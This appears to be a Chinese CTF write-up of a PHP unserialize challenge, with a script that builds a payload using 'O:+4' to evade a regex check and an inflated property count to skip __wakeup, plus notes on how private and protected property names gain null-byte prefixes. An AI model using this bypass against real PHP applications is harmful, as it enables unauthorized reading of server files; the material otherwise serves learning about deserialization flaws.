感觉挺有意思的一道题

先构造序列化对象，然后手动修改

O:+4:"Demo":2:{s:10:"Demofile";s:8:"fl4g.php";}

```php
<?php 
class Demo { 
    private $file = 'index.php';
    public function __construct($file) { 
        $this->file = $file; 
    }
    function __destruct() { 
        echo @highlight_file($this->file, true); 
    }
    function __wakeup() { 
        if ($this->file != 'index.php') { 
            //the secret is in the fl4g.php
            $this->file = 'index.php'; 
        } 
    } 
}
    $fl4g = new Demo('fl4g.php');
	$var = serialize($fl4g);
	echo $var."\n";

	$var = str_replace('O:4','O:+4',$var);	#用+4替换成4是为了绕过preg_match()的正则匹配
	echo $var."\n";
	$var = str_replace(':1:',':2:',$var);		#绕过__wakeup()魔术方法
	echo $var."\n";
	echo strlen($var)."\n";
	$var = base64_encode($var);	
	echo $var."\n"."\n";
	
	$input = 'O:+4:"Demo":2:{s:10:"Demofile";s:8:"fl4g.php";}';
    echo $input."\n";
	echo strlen($input)."\n";
	$input = base64_encode($input);
	echo $input."\n";
 ?>

```

然后发现你手动输入的并不是真正的输入，会有两个字符长度的差距导致base64编码后的结果也不一样。（卡我了一年）

var 和 public 声明的字段都是公共字段，因此它们的字段名的序列化格式是相同的。公共字段的字段名按照声明时的字段名进行序列化，但序列化后的字段名中不包括声明时的变量前缀符号$。
protected 声明的字段为保护字段，在所声明的类和该类的子类中可见，但在该类的对象实例中不可见。因此保护字段的字段名在序列化时，字段名前面会加上\0\0的前缀。这里的\0表示 ASCII 码为0的字符，而不是\0组合。
  private声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，字段名前面会加上\0\0的前缀。这里 表示的是声明该私有字段的类的类名，而不是被序列化的对象的类名。因为声明该私有字段的类不一定是被序列化的对象的类，而有可能是它的祖先类。
  字段名被作为字符串序列化时，字符串值中包括根据其可见性所加的前缀。字符串长度也包括所加前缀的长度。其中\0字符也是计算长度的。

  所以这里的private $file = ‘index.php’;中private在被序列化的时候给Demofile（类名属性名）中的类Demo前后分别加上一个了\0，导致Base64编码的值不同。
  如果这里的声明是public，被序列化后的属性名就只是file（属性名）。
  通过给赋值粘贴的字符串中的Demofile中的类Demo前后也分别加上一个了\0，可以验证上面的结论：

序列化结果为：
O:6:"class1":3:{s:1:"a";s:1:"1";s:4:"*b";s:5:"ThisB";s:9:"class1c";s:5:"ThisC";}
对象序列化后的结构为：
O:对象名的长度:"对象名":对象属性个数:{s:属性名的长度:"属性名";s:属性值的长度:"属性值";}
a是public类型的变量，s表示字符串，1表示变量名的长度，a是变量名。
b是protected类型的变量，它的变量名长度为4，也就是b前添加了%00*%00。所以，protected属性的表示方式是在变量名前加上%00*%00。
c是private类型的变量，c的变量名前添加了%00类名%00。所以，private属性的表示方式是在变量名前加上%00类名%00。
虽然Test类中有test1方法，但是，序列化得到的字符串中，只保存了公有变量a，保护变量b和私有变量c，并没保存类中的方法。也可以看出，序列化不保存方法。

下次就记得了

